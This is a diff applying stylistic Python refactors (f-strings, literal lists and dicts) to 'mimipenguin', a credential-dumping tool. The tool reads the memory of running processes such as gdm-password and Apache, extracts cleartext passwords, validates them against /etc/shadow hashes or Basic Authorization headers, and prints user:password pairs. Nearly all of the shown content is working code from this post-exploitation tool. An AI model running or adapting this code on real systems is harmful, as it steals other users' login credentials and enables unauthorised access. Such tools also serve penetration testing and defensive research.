@@ -41,11 +41,11 @@ def get_linux_distribution():
 
 
 def compute_hash(ctype, salt, password):
-    return crypt.crypt(password, '{}{}'.format(ctype, salt))
+    return crypt.crypt(password, f'{ctype}{salt}')
 
 
 def strings(s, min_length=4):
-    strings_result = list()
+    strings_result = []
     result = str()
 
     for c in s:
@@ -67,14 +67,14 @@ def strings(s, min_length=4):
 def dump_process(pid):
     dump_result = bytes()
 
-    with open('/proc/{}/maps'.format(pid), 'r') as maps_file:
-        for l in maps_file.readlines():
+    with open(f'/proc/{pid}/maps', 'r') as maps_file:
+        for l in maps_file:
             memrange, attributes = l.split(' ')[:2]
             if attributes.startswith('r'):
                 memrange_start, memrange_stop = [
                     int(x, 16) for x in memrange.split('-')]
                 memrange_size = memrange_stop - memrange_start
-                with open('/proc/{}/mem'.format(pid), 'rb') as mem_file:
+                with open(f'/proc/{pid}/mem', 'rb') as mem_file:
                     try:
                         mem_file.seek(memrange_start)
                         dump_result += mem_file.read(memrange_size)
@@ -85,11 +85,11 @@ def dump_process(pid):
 
 
 def find_pid(process_name):
-    pids = list()
+    pids = []
 
     for pid in os.listdir('/proc'):
         try:
-            with open('/proc/{}/cmdline'.format(pid), 'rb') as cmdline_file:
+            with open(f'/proc/{pid}/cmdline', 'rb') as cmdline_file:
                 if process_name in cmdline_file.read().decode():
                     pids.append(pid)
         except IOError:
@@ -102,12 +102,12 @@ class PasswordFinder:
     _hash_re = r'^\$.\$.+$'
 
     def __init__(self):
-        self._potential_passwords = list()
-        self._strings_dump = list()
-        self._found_hashes = list()
+        self._potential_passwords = []
+        self._strings_dump = []
+        self._found_hashes = []
 
     def _dump_target_processes(self):
-        target_pids = list()
+        target_pids = []
         for target_process in self._target_processes:
             target_pids += find_pid(target_process)
         for target_pid in target_pids:
@@ -128,14 +128,12 @@ class PasswordFinder:
         self._potential_passwords = list(set(self._potential_passwords))
 
     def _try_potential_passwords(self):
-        valid_passwords = list()
-        found_hashes = list()
-        pw_hash_to_user = dict()
+        valid_passwords = []
+        pw_hash_to_user = {}
 
-        if self._found_hashes:
-            found_hashes = self._found_hashes
+        found_hashes = self._found_hashes or []
         with open('/etc/shadow', 'r') as f:
-            for l in f.readlines():
+            for l in f:
                 user, pw_hash = l.split(':')[:2]
                 if not re.match(PasswordFinder._hash_re, pw_hash):
                     continue
@@ -209,7 +207,7 @@ class ApachePasswordFinder(PasswordFinder):
         self._needles = [r'^Authorization: Basic.+']
 
     def _try_potential_passwords(self):
-        valid_passwords = list()
+        valid_passwords = []
 
         for potential_password in self._potential_passwords:
             try:
@@ -236,7 +234,7 @@ def main():
     if not running_as_root():
         raise RuntimeError('mimipenguin should be ran as root')
 
-    password_finders = list()
+    password_finders = []
 
     if find_pid('gdm-password'):
         password_finders.append(GdmPasswordFinder())
@@ -251,8 +249,9 @@ def main():
 
     for password_finder in password_finders:
         for valid_passwords in password_finder.dump_passwords():
-            print('{}\t{}:{}'.format(password_finder._source_name,
-                                     valid_passwords[0], valid_passwords[1]))
+            print(
+                f'{password_finder._source_name}\t{valid_passwords[0]}:{valid_passwords[1]}'
+            )
 
 
 if __name__ == '__main__':
